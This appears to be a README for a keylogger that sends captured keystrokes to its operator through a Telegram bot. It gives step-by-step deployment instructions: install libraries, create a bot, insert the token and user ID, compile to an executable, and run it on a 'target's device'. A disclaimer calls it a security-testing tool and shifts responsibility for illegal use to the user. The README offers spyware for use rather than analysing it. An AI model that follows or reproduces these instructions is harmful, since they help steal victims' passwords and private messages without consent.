Simple keylogger imitation with output through Telegram bot.

1. Run install.py to install required Python libraries
2. Use @BotFather bot in Telegram to create an output bot
3. Insert your user ID number and bot token into tg_output_bot.py as comments tell
4. Run compile.exe to compile the program. Run .exe file on target's device. The file is autonomous, 'build' folder isn't required
5. MADE TO TEST CYBERSECURITY VULNERABILITIES. Pay attention that instructions i give only allow you to make a program which should be ran by target user, not hidden auto-running service. Any illegal usage is your own responsibility.

Tested on Windows 10.
Requires Python3 and Telegram account.
